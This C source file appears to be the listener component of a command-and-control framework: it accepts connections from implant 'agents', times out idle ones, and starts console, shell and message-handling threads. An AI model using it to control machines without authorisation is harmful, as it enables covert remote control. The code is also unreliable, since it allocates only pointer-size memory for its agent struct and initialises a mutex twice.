/*
listener.c

This is the main file for the listener. It will do the following:
* spawn threads
* create the listening socket
* listen for new agents to connect

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <pthread.h>
#include <poll.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/types.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "base.h"
#include "listener_comms.h"
#include "console.h"
#include "listener_handler.h"

#define LISTEN_BACKLOG	3
#define DEFAULT_PORT	55555
#define CHECK_ALIVE_FREQUENCY	10

// Globals
// Agents poll and states
Connected_Agents *connected_agents;
pthread_mutex_t agents_lock;
// Receive Queue
Queue* listener_receive_queue;
pthread_mutex_t listener_receive_queue_lock;
// Send Queue
Queue* listener_send_queue;
pthread_mutex_t listener_send_queue_lock;
// Alarm flag
volatile sig_atomic_t listener_alive_flag = false;
// SIGINT flag
volatile sig_atomic_t all_sigint = false;
volatile sig_atomic_t shell_sigint = false;
volatile sig_atomic_t shell_flag = false;

void int_handler(int sig){
    printf("CTRL-c\n");
    (shell_flag) ? (shell_sigint = true) : (all_sigint = true);
}

void listener_alive_alarm(int sig){
	listener_alive_flag = true;
}

void *check_alive_thread(void *vargp){
	signal(SIGALRM, listener_alive_alarm);
	while (!all_sigint){
        alarm(CHECK_ALIVE_FREQUENCY);
		if (listener_alive_flag){
            pthread_mutex_lock(&agents_lock);
			for (int i = 0; i < FDSIZE; i++){
				if (connected_agents->agents[i].alive && connected_agents->agents[i].alive + AGENT_TIMEOUT < time(NULL)){
					printf("Agent %d timeout, removing from poll\n", i);
					agent_delete(i);
				}
			}
			
			listener_alive_flag = false;
            pthread_mutex_unlock(&agents_lock);
		}
	}
    printf("check_alive_thread done\n");
	return 0;
}

int start_sockets(int port){
    int retval;
    int listener_socket, agent_socket;
    int opt = 1;
    struct sockaddr_in addr;
    char *buffer;
    socklen_t addr_len = sizeof(addr);
    fd_set accept_fds;
    struct timeval tv;

    int *fd_count = connected_agents->fd_count;
	struct pollfd *pfds = connected_agents->pfds;

    if ((listener_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("Socket failed\n");
        all_sigint = true;
        return RET_ERROR;
    }

    if (setsockopt(listener_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))){
        printf("setsockopt failed\n");
        all_sigint = true;
        return RET_ERROR;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(listener_socket, (struct sockaddr*)&addr, sizeof(addr)) < 0){
        printf("bind failed\n");
        all_sigint = true;
        return RET_ERROR;
    }

    if (listen(listener_socket, LISTEN_BACKLOG) < 0){
        printf("listen failed\n");
        all_sigint = true;
        return RET_ERROR;
    }

    while (!all_sigint){
        
        // set select options
        tv.tv_sec = SELECT_TIMEOUT;
        tv.tv_usec = 0;
        FD_ZERO(&accept_fds);
        FD_SET(listener_socket, &accept_fds);

        retval = select(listener_socket + 1, &accept_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error\n");
            all_sigint = true;
        }
        else if (FD_ISSET(listener_socket, &accept_fds)){
            if ((agent_socket = accept(listener_socket, (struct sockaddr*)&addr, &addr_len)) < 0){
                printf("accept failed\n");
                all_sigint = true;
            }
            else if (agent_socket >= FDSIZE){
                print_out("%s\n", "Agent connected but too many connections");
                close(agent_socket);
            }
            else {
                // add agent to global struct
                print_out("Agent connected %d\n", agent_socket);
                agent_add(agent_socket);
            }
        }
    }

    close(listener_socket);
    printf("listening socket done\n");
    return RET_OK;
}

#ifndef UNIT_TESTING
int main(int argc, char *argv[]){
    int opt;
    int port = DEFAULT_PORT;
    pthread_t listener_receive_tid, listener_send_tid, console_tid, listener_handler_tid, check_alive_tid;
    struct pollfd *pfds;
    Agent *agents;
    int fd_count = 0;
    
    while((opt = getopt(argc, argv, "p:h")) != -1){
        switch(opt){
            case 'p':
                port = atoi(optarg);
                break;
            case 'h':
                printf("Help\n");
                return RET_OK;
            case '?':
                printf("Unknown argument %c\n", optopt);
                return RET_ERROR;
            case ':':
                printf("Missing argument %c\n", optopt);
                return RET_ERROR;
        }
    }
    
    // set signal hander for SIGINT
    signal(SIGINT, int_handler);

    // Setup Connected_Agents struct
    connected_agents = malloc(sizeof(connected_agents));
    pfds = malloc(sizeof(struct pollfd) * FDSIZE);
    memset(pfds, 0, sizeof(struct pollfd) * FDSIZE);
    agents = malloc(sizeof(Agent) * FDSIZE);
    memset(agents, 0, sizeof(Agent) * FDSIZE);
    connected_agents->fd_count = &fd_count;
    connected_agents->pfds = pfds;
    connected_agents->agents = agents;
    // create connected_agents mutex
    pthread_mutex_init(&agents_lock, NULL);

    // Create receive queue
    listener_receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&listener_receive_queue_lock, NULL);
    // Create send queue
    listener_send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&listener_send_queue_lock, NULL);

    // Start agent receive thread
    pthread_create(&listener_receive_tid, NULL, listener_receive_thread, NULL);
    // Start agent send thread
    pthread_create(&listener_send_tid, NULL, listener_send_thread, NULL);
    // Start console thread
    pthread_create(&console_tid, NULL, console_thread, NULL);
    // Start message handler thread
    pthread_create(&listener_handler_tid, NULL, listener_handler_thread, NULL);
    // Start keep alive thread
    pthread_create(&check_alive_tid, NULL, check_alive_thread, NULL);

    // Create agents structure mutex
    pthread_mutex_init(&agents_lock, NULL);

    start_sockets(port);
    // If we get here, something broke on our listening socket. Close everything.
    all_sigint = true;

    pthread_join(listener_receive_tid, NULL);
    pthread_join(listener_send_tid, NULL);
    pthread_join(console_tid, NULL);
    pthread_join(listener_handler_tid, NULL);
    pthread_join(check_alive_tid, NULL);

    printf("%s\n", "closed cleanly");
    return RET_OK;
}
#endif /* UNIT_TESTING */


